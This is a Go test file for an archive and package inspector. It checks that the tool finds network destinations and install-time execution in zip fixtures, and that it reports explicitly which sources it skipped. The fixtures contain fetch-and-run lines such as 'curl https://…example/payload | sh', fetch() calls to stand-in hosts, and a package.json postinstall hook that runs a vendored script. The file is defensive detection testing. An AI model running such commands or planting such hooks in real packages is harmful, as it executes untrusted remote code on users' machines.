package report

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/0x4D31/maratus/internal/artifact"
	"github.com/0x4D31/maratus/internal/behavior"
)

func TestInspectArchivePathRolesCannotSuppressShallowRunnableCandidates(t *testing.T) {
	entries := map[string][]byte{
		"build/payload.sh":        []byte("curl https://build-role.example/payload | sh\n"),
		"docs/payload.sh":         []byte("curl https://docs-role.example/payload | sh\n"),
		"fixtures/payload.sh":     []byte("curl https://fixture-role.example/payload | sh\n"),
		"node_modules/payload.sh": []byte("curl https://vendor-role.example/payload | sh\n"),
		"tests/payload.sh":        []byte("curl https://test-role.example/payload | sh\n"),
	}
	path := filepath.Join(t.TempDir(), "role-evasion.zip")
	if err := os.WriteFile(path, zipEntries(t, entries), 0o600); err != nil {
		t.Fatal(err)
	}

	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if len(rep.ExecutionRoots) != 0 {
		t.Fatalf("candidate archive members became execution roots: %#v", rep.ExecutionRoots)
	}
	for _, destination := range []string{
		"https://build-role.example/payload",
		"https://docs-role.example/payload",
		"https://fixture-role.example/payload",
		"https://vendor-role.example/payload",
		"https://test-role.example/payload",
	} {
		assertNetworkDestination(t, rep, destination)
	}
	for _, operation := range rep.Operations {
		if operation.Execution.Connectivity != behavior.ConnectivityUnconnected {
			t.Fatalf("candidate operation gained execution connectivity from archive membership: %#v", operation)
		}
	}
	assertNoSourceRoleSkipCoverage(t, rep)
	assertNoRecordedCoverageGaps(t, rep)
}

func TestInspectIncludeUnreferencedMakesNestedSourceRolePolicyExplicit(t *testing.T) {
	path := filepath.Join(t.TempDir(), "nested-role.zip")
	archive := zipEntries(t, map[string][]byte{
		"node_modules/pkg/payload.js": []byte(`fetch("https://nested-vendor.example/api")`),
	})
	if err := os.WriteFile(path, archive, 0o600); err != nil {
		t.Fatal(err)
	}

	plain, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertNoNetworkDestination(t, plain, "https://nested-vendor.example/api")
	coverage := sourceRoleCoverage(plain, "behavior-source-role/vendor")
	if len(coverage) != 1 || coverage[0].Status != "skipped" || !strings.Contains(coverage[0].Detail, "use --include-unreferenced") {
		t.Fatalf("default vendor omission is not explicit: %#v", plain.Coverage)
	}

	deep, err := InspectPath(path, artifact.Options{IncludeUnreferenced: true})
	if err != nil {
		t.Fatal(err)
	}
	assertNetworkDestination(t, deep, "https://nested-vendor.example/api")
	assertNoSourceRoleSkipCoverage(t, deep)
}

func TestInspectDeclaredPackageTargetOverridesVendorSourceRole(t *testing.T) {
	path := filepath.Join(t.TempDir(), "declared-target.zip")
	archive := zipEntries(t, map[string][]byte{
		"package.json":                []byte(`{"scripts":{"postinstall":"node node_modules/pkg/payload.js"}}`),
		"node_modules/pkg/payload.js": []byte(`fetch("https://declared-vendor.example/api")`),
	})
	if err := os.WriteFile(path, archive, 0o600); err != nil {
		t.Fatal(err)
	}

	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if len(rep.ExecutionRoots) == 0 {
		t.Fatalf("declared package produced no execution roots: nodes=%#v coverage=%#v diagnostics=%#v", rep.ArtifactNodes, rep.Coverage, rep.Diagnostics)
	}
	assertExecutionRecordArguments(t, rep, "lifecycle-target", "postinstall", []string{"declared-target.zip!node_modules/pkg/payload.js"})
	assertNetworkDestination(t, rep, "https://declared-vendor.example/api")
	foundConnected := false
	for _, operation := range rep.Operations {
		if operation.Kind == "network.connect" && operation.RequiredResource().Value == "https://declared-vendor.example/api" {
			foundConnected = operation.Execution.Connectivity == behavior.ConnectivityConnected && len(operation.Execution.ExecutionRootIDs) > 0
		}
	}
	if !foundConnected {
		t.Fatalf("declared vendor target operation was not connected to its execution root: %#v", rep.Operations)
	}
	assertNoSourceRoleSkipCoverage(t, rep)
}

func TestInspectIncludeUnreferencedOverridesBundledToolchainHint(t *testing.T) {
	path := filepath.Join(t.TempDir(), "bundled-go.zip")
	archive := zipEntries(t, map[string][]byte{
		"bin/go":                             {},
		"bin/launcher.sh":                    []byte("curl https://toolchain-root.example/payload | sh\n"),
		"pkg/tool/darwin_arm64/compile":      {},
		"src/nested/unrelated-library.js":    []byte(`fetch("https://toolchain-internal.example/api")`),
		"outside/nested/target-component.js": []byte(`fetch("https://deep-target.example/api")`),
	})
	if err := os.WriteFile(path, archive, 0o600); err != nil {
		t.Fatal(err)
	}

	shallow, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertNetworkDestination(t, shallow, "https://toolchain-root.example/payload")
	assertNoNetworkDestination(t, shallow, "https://toolchain-internal.example/api")
	coverage := sourceRoleCoverage(shallow, "behavior-source-role/vendor-toolchain")
	if len(coverage) != 1 || coverage[0].Status != "skipped" || !strings.Contains(coverage[0].Detail, "--include-unreferenced") {
		t.Fatalf("default toolchain exclusion is not explicit: %#v", shallow.Coverage)
	}

	rep, err := InspectPath(path, artifact.Options{IncludeUnreferenced: true})
	if err != nil {
		t.Fatal(err)
	}
	assertNetworkDestination(t, rep, "https://toolchain-root.example/payload")
	assertNetworkDestination(t, rep, "https://deep-target.example/api")
	assertNetworkDestination(t, rep, "https://toolchain-internal.example/api")

	assertNoSourceRoleSkipCoverage(t, rep)
	foundToolchainSource := false
	for _, node := range rep.ArtifactNodes {
		if strings.HasSuffix(node.LogicalPath, "src/nested/unrelated-library.js") && node.SourceRole != "vendor/toolchain" {
			t.Fatalf("bundled SDK source role = %q, want vendor/toolchain", node.SourceRole)
		}
		if strings.HasSuffix(node.LogicalPath, "src/nested/unrelated-library.js") {
			foundToolchainSource = true
		}
	}
	if !foundToolchainSource {
		t.Fatal("bundled SDK source node was not retained in the artifact inventory")
	}
}

func sourceRoleCoverage(rep Report, analysisArea string) []behavior.Coverage {
	var out []behavior.Coverage
	for _, item := range rep.Coverage {
		if item.AnalysisArea == analysisArea {
			out = append(out, item)
		}
	}
	return out
}

func assertNoSourceRoleSkipCoverage(t *testing.T, rep Report) {
	t.Helper()
	for _, item := range rep.Coverage {
		if strings.HasPrefix(item.AnalysisArea, "behavior-source-role/") && item.Status != "analyzed" {
			t.Fatalf("unexpected source-role coverage gap: %#v", item)
		}
	}
}

func assertNoRecordedCoverageGaps(t *testing.T, rep Report) {
	t.Helper()
	if len(rep.ArtifactNodes) == 0 {
		t.Fatal("report retained no artifact nodes")
	}
	for _, node := range rep.ArtifactNodes {
		if node.AnalyzeStatus != "analyzed" {
			t.Fatalf("unexpected artifact coverage gap: %#v", node)
		}
	}
	for _, item := range rep.Coverage {
		if item.Status != "analyzed" {
			t.Fatalf("unexpected analysis coverage gap: %#v", item)
		}
	}
}
